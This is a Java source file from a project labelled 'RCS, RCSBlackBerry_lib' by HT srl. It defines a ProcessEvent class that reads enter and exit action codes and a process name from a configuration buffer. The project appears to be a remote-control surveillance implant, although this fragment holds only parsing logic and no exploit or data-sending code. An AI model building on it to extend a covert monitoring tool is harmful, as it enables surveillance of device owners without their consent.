/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : ProcessEvent.java 
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import java.io.EOFException;

import blackberry.action.Action;
import blackberry.utils.Check;
import blackberry.utils.WChar;
import net.rim.device.api.util.DataBuffer;

public class ProcessEvent extends Event {

	int actionOnEnter = Action.ACTION_NULL;
	int actionOnExit = Action.ACTION_NULL;
	
	String process;
	
    public ProcessEvent(final int actionId, final byte[] confParams) {
        super(Event.EVENT_PROCESS, actionId, confParams);
    }

    protected void actualRun() {
        
    }

    protected boolean parse(final byte[] confParams) {
    	DataBuffer databuffer = new DataBuffer(confParams, 0, confParams.length, false);
    	try {
			actionOnEnter = databuffer.readShort();
			actionOnExit = databuffer.readShort();
			
			int value = databuffer.readInt();			
			int len = databuffer.readInt();
			
			byte[] payload = new byte[len];
			databuffer.read(payload);
			
			process = WChar.getString(payload, true);
			
			// #ifdef DBC
			Check.asserts(actionOnEnter >= 0, "negative value Enter");
			Check.asserts(actionOnExit >= 0, "negative value Exit");
			// #endif

		} catch (EOFException e) {
			return false;
		}
    	
        return true;
    }

}
